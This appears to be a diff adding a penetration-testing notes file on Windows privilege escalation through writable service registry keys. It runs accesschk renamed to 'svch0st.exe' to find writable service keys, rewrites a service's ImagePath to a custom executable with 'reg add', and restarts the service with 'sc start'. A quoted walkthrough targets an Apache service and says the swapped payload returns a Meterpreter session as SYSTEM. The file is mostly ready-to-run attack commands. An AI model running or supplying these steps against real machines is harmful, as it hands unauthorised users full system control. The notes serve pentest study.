@@ -1,0 +1,31 @@
+
+# Find writeable registry keys for services using Accesschk
+svch0st.exe -kwsu hostname\username hklm\system\currentcontrolset\services
+
+# change image path
+reg add HKLM\SYSTEM\CURRENTCONTROLSET\Services\SomeSoftwareName /v ImagePath \d "C:\temp\winlogon.exe"
+
+# restart the service
+sc start SomeSoftwareName
+
+
+------------------------------------------------------------------------------------------------
+
+Registry keys for the services that are running on the system can be found in the following registry path:
+
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services
+
+If a standard user has permissions to modify the registry key “ImagePath” which contains the path to the application binary 
+then he could escalate privileges to system as the Apache service is running under these privileges.
+
+C:\Users\pentestlab\Desktop>reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Apache"
+/t REG_EXPAND_SZ /v ImagePath /d "C:\xampp\pentestlab2.exe" /f
+ 
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Apache"
+/t REG_EXPAND_SZ /v ImagePath /d "C:\xampp\pentestlab2.exe" /f
+ 
+The operation completed successfully.
+
+The next time that the service will restart, the custom payload will be executed instead of the service binary and it will 
+return back a Meterpreter session as SYSTEM.
+
